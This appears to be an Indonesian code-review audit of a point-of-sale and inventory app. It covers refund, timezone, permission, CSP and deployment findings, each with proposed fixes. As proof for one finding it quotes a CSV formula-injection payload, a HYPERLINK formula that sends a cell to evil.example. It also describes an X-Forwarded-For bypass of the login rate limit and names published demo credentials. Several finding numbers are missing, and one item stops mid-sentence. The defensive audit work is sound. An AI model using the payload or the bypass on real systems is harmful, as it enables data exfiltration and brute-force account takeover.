## Yang sudah bagus (jangan dirombak)

1. **Ledger-first untuk stok.** `stock_movements` adalah satu-satunya pintu perubahan stok
   (`server/src/inventory.js`), semua operasi dibungkus `tx()` dengan `BEGIN IMMEDIATE`,
   `balance_after` tercatat, dan ada `ledgerIntegrity()` + `reconcileStock()` untuk audit.
   Balapan 120 kasir pada bahan yang sama lolos tanpa selisih (QA §12).
2. **Idempotensi `external_ref`** + unique index → double-submit jaringan tidak memotong stok dua kali.
3. **Addon divalidasi ke DB** (`resolveAddons()` di `server/src/sales.js:38`) — perbaikan putaran pertama
   masih utuh: harga/bahan tidak bisa dipalsukan lewat payload klien (ada tes regresinya).
4. **Default-deny autentikasi** dipasang di level router (`server/src/routes/index.js:17`), sehingga rute baru
   tidak bisa "lupa" diproteksi; permission dihitung ulang dari DB tiap permintaan (ganti role langsung berlaku).
5. **Scoping toko** konsisten di rute tulis (`WHERE id = ? AND store_id = ?`), plus tes isolasi antar toko.
6. **Alat pemeliharaan serius**: `VACUUM INTO` + `integrity_check` + `foreign_key_check` + rotasi, latihan
   restore bulanan di crontab, unit systemd yang di-harden (`ProtectSystem=strict`, `NoNewPrivileges`).
7. **Mesin harga dipakai bersama** server & client (`@shared`) → angka layar = angka struk.
8. **Dokumentasi 10 berkas** yang benar-benar menjelaskan *kenapa*, bukan hanya *apa*.

## Temuan P0 — integritas data

### 1. Refund bisa diulang tanpa batas → stok bahan baku digandakan

**Lokasi** `server/src/sales.js:247-273` (`refundLine`), rute `server/src/routes/pos.js:103-110`.

`refundLine()` hanya membatasi `qty` terhadap **qty baris asli**:

```js
const refundQty = Math.min(Number(qty) || 0, line.qty);   // sales.js:252
```

Tidak ada pemeriksaan berapa yang **sudah** diretur, tidak ada kolom `refunded_qty` di
`transaction_items` (`schema.sql:292-307`), tidak ada status `refunded` yang pernah di-set
(padahal CHECK constraint-nya sudah menyediakan: `schema.sql:265`), dan tidak ada baris uang
keluar di `transaction_payments`.

**Bukti runtime** (DB seed, item *Americano*, make-to-order, jual 2 porsi lalu refund 3×):

```
sale   : Biji Kopi -40.8 · Cup -2 · Es Batu -216
refund #1: +40.8 / +2 / +216      (HTTP 200)
refund #2: +40.8 / +2 / +216      (HTTP 200)
refund #3: +40.8 / +2 / +216      (HTTP 200)

Biji Kopi House Blend : 25386.32 → 25467.92   (+81.6 gr padahal hanya 40.8 yang terpakai)
Cup Plastik 16oz + Lid:      700 →      704
Es Batu Food Grade    :    45000 →    45432
status transaksi      : completed   grand_total: 39950 (tidak berubah)
reports gross_revenue : tetap menghitung struk ini penuh
```

**Dampak** stok fiktif (bahan "muncul dari udara"), HPP rata-rata bergerak terdistorsi,
laporan laba-rugi salah, dan celah kecurangan bagi siapa pun yang memegang `sale.void`.
Klik ganda di modal retur saja sudah cukup untuk memicu selisih.

**Usulan perbaikan**

```js
// sales.js — di dalam refundLine(), sebelum menghitung plan
const alreadyReturned = firstRow(
  `SELECT COALESCE(SUM(m.qty),0) AS n
     FROM stock_movements m
     JOIN transaction_items ti ON ti.transaction_id = ? AND ti.item_id = ?
    WHERE m.ref_type = 'refund' AND m.ref_id = ? AND m.voided = 0
      AND m.movement_type = 'return_in' AND m.item_id = ?`,
  txId, itemId, txId, itemId)?.n || 0;                      // perlu dipetakan per baris, bukan per bahan
const sisa = line.qty - alreadyReturnedForLine;              // simpan di transaction_items.refunded_qty
if (refundQty > sisa) throw new AppError(409, `Hanya ${sisa} yang masih bisa diretur`);
```

Cara paling bersih: tambah kolom `refunded_qty REAL NOT NULL DEFAULT 0` di `transaction_items`,
naikkan di dalam `tx()` yang sama, lalu set `transactions.status = 'refunded'` bila penuh /
`'partial_refund'` bila sebagian, catat pengembalian uang (`transaction_payments.amount` negatif
atau tabel `refunds`), dan buat laporan mengurangi pendapatan sebesar nilai retur.
Tambahkan tes: *refund 2× atas baris yang sama → 409, stok tidak berubah*.

### 2. Retur memakai resep & harga **hari ini**, sementara UI menjanjikan snapshot

**Lokasi** `server/src/sales.js:255-257` (memanggil `catalogFor(storeId)` + `recipesFor([itemId])`),
teks UI `client/src/features/pos/SalesHistory.jsx:194`:

> "Retur mengembalikan stok sesuai porsi bahan di BOM saat transaksi dibuat (menggunakan snapshot, bukan harga/resep hari ini)."

`docs/03-stok-dan-bom.md:97` justru mengaku jujur: "*dihitung ulang dengan `planStockImpact`*".
Jadi UI berbohong kepada pengguna.

**Dampak** bila resep/harga bahan diganti setelah struk tercetak (hal yang rutin terjadi di F&B),
retur mengembalikan jumlah bahan yang salah — dan karena retur tidak membalik gerakan asli,
selisihnya tidak terlacak.

**Usulan** simpan rencana potongan (`plan.finished` + `plan.raw`) ke dalam `receipt_snapshot` saat
`createSale`, lalu retur = balikkan potongan itu secara proporsional (`f = qty_retur / qty_baris`),
persis pola `reverseMovements()` yang sudah terbukti benar untuk void. Sementara belum dikerjakan,
perbaiki teks UI agar tidak menyesatkan.

### 4. Zona waktu: runtime menulis UTC, seed & logika bisnis memakai waktu lokal

**Lokasi** `server/src/db/index.js:74` (`nowIso()` = `new Date().toISOString()` → UTC),
`server/scripts/seed.js:245-257` (stempel dibangun dari komponen **lokal** `new Date(y,m,d,hour,min)`),
`server/src/routes/reports.js:16-18` (`range()` default = tanggal UTC),
`server/src/routes/reports.js:44` (`strftime('%H', created_at, 'localtime')` = TZ **server**),
`server/src/sales.js:76` (`nextInvoiceNo` memakai tanggal UTC).
`settings.store.timezone` (default `Asia/Jakarta`) **disimpan tapi tidak pernah dipakai di query mana pun**.

**Bukti runtime**

```
stempel yang ditulis runtime (UTC)                     : 2026-09-17 05:11:46
gerakan seed yang stempelnya LEBIH BARU dari "now"      : 67   (maks 2026-09-17 19:29:00)
transaksi seed yang stempelnya LEBIH BARU dari "now"    : 13
posisi gerakan struk baru di ORDER BY created_at DESC   : 68  → limit=60 tidak memuatnya
```

Empat akibat nyata:

* **Smoke UI gagal** (lihat temuan 12) karena `GET /stock/movements?limit=60` tidak memuat gerakan
  struk yang baru dibuat — 67 baris seed "dari masa depan" mendorongnya keluar jendela.
* **Halaman Stok → Ledger tidak menampilkan pergerakan terbaru** pada DB demo/hasil seed
  (persis yang dilihat pengguna baru, termasuk di Vercel yang auto-seed).
* **Batas hari laporan salah**: transaksi 00:00–06:59 WIB tercatat pada tanggal UTC hari sebelumnya,
  sehingga "hari ini" di dasbor kehilangan penjualan dini hari; `nextInvoiceNo` juga berganti hari
  jam 07:00 WIB → nomor struk tidak sinkron dengan hari bisnis toko.
* **Grafik jam sibuk bergeser**: transaksi uji yang saya buat pukul **12:12 WIB** muncul sebagai
  `hour: 5` karena `localtime` = TZ server (UTC). Di VPS/Vercel yang selalu UTC, seluruh analisis
  jam ramai toko Indonesia bergeser 7 jam.

**Usulan** putuskan satu konvensi dan tegakkan:

1. Simpan **UTC** di semua kolom (sudah begitu) — tetapi seed harus menulis UTC juga
   (`seed.js`: konversi `at.getTime()` → ISO, atau pakai `datetime('now','-N days')`).
2. Hitung hari bisnis di SQL dengan offset toko, misalnya
   `date(created_at, :tz_offset)` di mana `tz_offset` diturunkan dari `settings.store.timezone`
   (atau `Intl.DateTimeFormat(...).resolvedOptions()` → offset menit per tanggal).
3. Ganti `strftime('%H', created_at, 'localtime')` → `strftime('%H', created_at, :tz_offset)`.
4. Urutkan ledger dengan tie-breaker deterministik: `ORDER BY created_at DESC, rowid DESC`
   (`rowid` = urutan insert) alih-alih `m.id DESC` yang acak — stempel hanya presisi 1 detik.
5. Tambahkan tes: transaksi yang dibuat "sekarang" selalu muncul di `limit=10` gerakan terbaru,
   dan `range()` default mencakup transaksi yang dibuat 00:30 waktu toko.

## Temuan P1 — keamanan

### 6. Rate-limit login dilewati dengan `X-Forwarded-For` palsu

**Lokasi** `server/src/index.js:26` (`app.set('trust proxy', true)`) + `server/src/auth.js:73-85`
(penghitung per `req.ip`, in-memory).

`trust proxy: true` membuat Express mengambil **nilai paling kiri dari header XFF yang dikirim klien**,
jadi penyerang memilih IP-nya sendiri.

**Bukti**

```
tanpa XFF   : 401 401 401 401 401 429 429 429      (limit bekerja setelah 5 percobaan)
XFF diacak  : 401 401 401 401 401 401 401 401 …    (tidak pernah 429 → brute force tak terbatas)
```

Dampak diperparah oleh desain login: **PIN 4 digit dipakai sebagai kredensial penuh**
(`auth.js:97` — `verifyPassword(password, user.pin)`), jadi ruang kunci hanya 10.000 dan
username demo diketahui (`budi`, `dewi`, …). `ip` di `audit_logs` juga bisa dipalsukan.

**Usulan**

```js
app.set('trust proxy', process.env.KASIR_TRUST_PROXY ? Number(process.env.KASIR_TRUST_PROXY) : false);
// di produksi behind Caddy/nginx: trust proxy = 1 (satu hop) atau 'loopback'
```

Plus: kunci per `username` (bukan hanya IP), backoff progresif yang disimpan di DB
(`users.failed_attempts`, `locked_until`) supaya tahan restart & multi-proses,
dan jangan terima PIN sebagai kata sandi untuk login web (PIN hanya untuk shift kasir offline).

### 7. Permission per blok setting tidak ditegakkan

**Lokasi** `server/src/routes/settings.js:29-38`:

```js
router.put('/settings/:key', auth('setting.store'), ...)      // gerbang: setting.store
const need = permByBlock[key];                                // store|tax|receipt|theme|pos
if (!perms.includes('*') && !perms.includes(need) && !perms.includes('setting.store')) throw 403;
//                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ selalu true
```

Karena rute sudah mensyaratkan `setting.store`, klausa terakhir membuat peta `permByBlock`
menjadi **kode mati**: siapa pun yang punya `setting.store` bisa menulis blok `tax`, `receipt`,
`theme`, dan `pos`.

**Bukti** (role `manager` dibatasi hanya `['setting.store']` lewat `PUT /roles/manager`):

```
manager permissions              : ["setting.store"]
PUT /settings/tax  {default_rate_pct:0}  → 200   (harusnya 403: butuh setting.tax)
settings.tax.default_rate_pct sekarang   : 0     ← PPN toko dimatikan
PUT /settings/theme {app_name:'…'}       → 200   (harusnya 403: butuh setting.theme)
```

Empat permission yang dipromosikan di UI Hak Akses (`setting.store`, `setting.tax`,
`setting.receipt`, `setting.theme`) praktis menjadi satu. Menurunkan PPN 11% → 0% adalah
manipulasi pendapatan langsung.

**Usulan** hapus fallback dan petakan blok `pos` ke permission eksplisit:

```js
const need = permByBlock[key];
if (!perms.includes('*') && !perms.includes(need)) throw new AppError(403, `Butuh hak akses: ${need}`);
```

dengan gerbang rute dinaikkan menjadi `auth(['setting.store','setting.tax','setting.receipt','setting.theme'])`
lalu biarkan pemeriksaan per blok yang memutuskan. Tambahkan tes: role dengan hanya `setting.store`
→ `PUT /settings/tax` = 403.

### 8. CSV formula injection pada ekspor laporan

**Lokasi** `server/src/routes/reports.js:159-163`:

```js
const csvCell = (v) => { const s = v == null ? '' : String(v);
  return /[",\n;]/.test(s) ? `"${s.replace(/"/g,'""')}"` : s; };   // hanya quoting, tanpa netralisasi formula
```

`customer_name` / `customer_phone` / `note` diisi bebas di layar kasir.

**Bukti** — transaksi dibuat dengan nama pelanggan
`=HYPERLINK("http://evil.example/?c="&A1,"Klik")`, lalu `GET /reports/export/sales`:

```csv
KS20260917-1340,2026-09-17 05:10:10,Budi (Pemilik),completed,18000,0,1980,20000,1311.436,"=HYPERLINK(""http://evil.example/?c=""&A1,""Klik"")",Tunai
```

Ketika pemilik membuka CSV itu di Excel/LibreOffice, formula dieksekusi (eksfiltrasi sel lain,
atau DDE pada versi lama). Ini jalur serangan nyata karena kasir — atau pelanggan yang
mendiktekan nama — mengontrol isinya.

**Usulan**

```js
const csvCell = (v) => {
  let s = v == null ? '' : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;                 // netralisasi formula
  return /[",\n;]/.test(s) ? `"${s.replace(/"/g,'""')}"` : s;
};
```

### 9. CSP mengizinkan aplikasi dibingkai situs lain

**Lokasi** `server/src/index.js:34` — `frame-ancestors *`.

POS adalah target clickjacking yang menarik (tombol *Bayar*, *Void*, *Simpan pengaturan*).
Ganti ke `frame-ancestors 'self'` (atau `none`). Selagi di sana: `style-src 'unsafe-inline'`
masih diperlukan untuk `applyTheme`, tetapi `script-src 'self'` sudah benar — pertahankan,
dan pertimbangkan `object-src 'none'` + `upgrade-insecure-requests` di produksi.

### 10. Deployment Vercel: SQLite di `/tmp` + auto-seed kredensial demo

**Lokasi** `api/index.js:11-21`, `server/src/db/index.js:11`, `server/src/auth.js:13`,
README bagian "Deployment ke Vercel", `docs/09:179`.

* `KASIR_DATA_DIR` di Vercel = `/tmp` → **ephemeral dan per-instance**. Setiap container recycle
  menghapus seluruh transaksi; dua instance/region punya DB berbeda. Untuk sistem pencatatan
  keuangan ini bukan "batasan yang diketahui", melainkan **tidak layak produksi**.
* Rahasia JWT default di `/tmp/.jwt-secret` → semua sesi gugur tiap cold start (kasir terlempar
  ke layar login tanpa sebab yang mereka pahami).
* `getApp()` menjalankan `runSeed()` bila tabel `stores` kosong → di deployment publik, DB baru
  otomatis terisi **user demo `budi` dengan kata sandi `rahasia123` dan PIN 1111** yang
  dipublikasikan di README. Siapa pun yang menemukan URL preview Anda menjadi pemilik toko.

**Usulan** (pilih salah satu, lalu tulis jujur di README):

1. **Rekomendasi**: target produksi = VPS/systemd (dokumen `ops/` sudah lengkap dan bagus) atau
   container + volume persisten. Tandai bagian Vercel sebagai "demo/pratinjau UI saja".
2. Bila tetap ingin serverless: pindah ke DB eksternal (Turso/libSQL, Postgres, PlanetScale) di

## Temuan P2 — konsistensi, mutu, performa

### 11. Tiga rumus kapasitas porsi, dua mengabaikan `yield_pct`

| Fungsi | Rumus | Dipakai oleh |
|---|---|---|
| `bom.js:105` `rawCapacity()` | `stock ÷ (qty × (1+waste) ÷ yield)` ✅ | `/pos/catalog.capacity` (layar kasir) |
| `items.js:211` `maxServable()` | `stock ÷ (qty × (1+waste))` ❌ tanpa yield | `/items/:id/simulate.max_servable` |
| `stockhealth.js:43` `rawCapacity()` | `stock ÷ (qty × (1+waste))` ❌ tanpa yield | `/stock/health.serve_capacity` + **status alert** |

Mesin stok (`planStockImpact`, `bom.js:56`) membagi dengan `yieldFactor`, jadi dua fungsi lain
**lebih optimis** daripada kenyataan.

**Bukti** (item uji: resep 10 unit bahan/porsi, `yield_pct = 50` → kebutuhan efektif 20 unit/porsi,
stok bahan 25.467,92):

```
/pos/catalog.capacity              : 1273   ← benar (sama dengan mesin stok)
/items/:id/simulate.max_servable   : 2546   ← 2× terlalu optimis
/stock/health.serve_capacity       : 2546   ← 2× terlalu optimis
/items/:id/simulate.deduct_raw     : 20 unit untuk 1 porsi (engine benar)
```

Dampak: dasbor menjanjikan porsi yang tidak bisa dibuat, dan status `out`/`critical`/`warning`
di `stockHealth()` (yang memanggil `rawCapacity` versi salah) **telat menyala** untuk semua item
ber-yield < 100% — persis item produksi seperti roti/tumpeng yang jadi alasan sistem ini ada.
Komentar di `bom.js:102-103` sudah menyatakan niat yang benar ("pakai rumus yang sama …
supaya angka di layar tidak pernah lebih optimis dari mesin stok") — dua fungsi lain melanggar niat itu.

**Usulan** satu sumber kebenaran: ekspor `rawCapacity(itemId, catalog, recipes)` dari `bom.js`,
hapus duplikat di `items.js` dan `stockhealth.js` (untuk stockhealth, muat resep+stok dalam satu
query batch agar tidak N+1), lalu kunci dengan tes: item `yield_pct = 50` → semua endpoint
melaporkan kapasitas yang sama. Sekalian putuskan perilaku `yield > 100%`
(`Math.max(1, yield/100)` di `bom.js:51` meng-clamp-nya jadi 100% → konsumsi bahan kurang
tercatat untuk resep yang mengembang).

### 13. Smoke UI membocorkan proses server → run berikutnya menguji DB kotor

`client/tests/ui-smoke.entry.jsx:169` memanggil `process.exit()` **di dalam bundel yang di-import**,
sehingga runner (`ui-smoke.mjs:65-70`) mati sebelum `cleanup()` sempat `child.kill()`.

**Bukti**

```
run 1 (gagal) → ss -ltnp : node pid=1766 LISTEN 0.0.0.0:4399      ← orphan, KASIR_DATA_DIR=/tmp/kasirui-Dtiec3
run 2         → "stok Butter Croissant: 130 → 128"                ← melanjutkan DB run 1 (bukan seed baru!)
              → orphan baru lagi di 4399 setelah run selesai
```

Run kedua diam-diam menguji server & DB run pertama (port sudah terpakai, tetapi URL tetap
`http://127.0.0.1:4399`), jadi hasil CI tidak reproduktif dan bisa hijau/merah tergantung urutan.

**Usulan** entry tidak boleh `process.exit()`: set `process.exitCode = fails ? 1 : 0` lalu biarkan
runner yang membersihkan dan keluar; atau pasang `process.on('exit', cleanup)` +
`child.kill()` di `finally` pada runner, dan beri server anak `PORT=0`/port acak agar tidak bentrok.
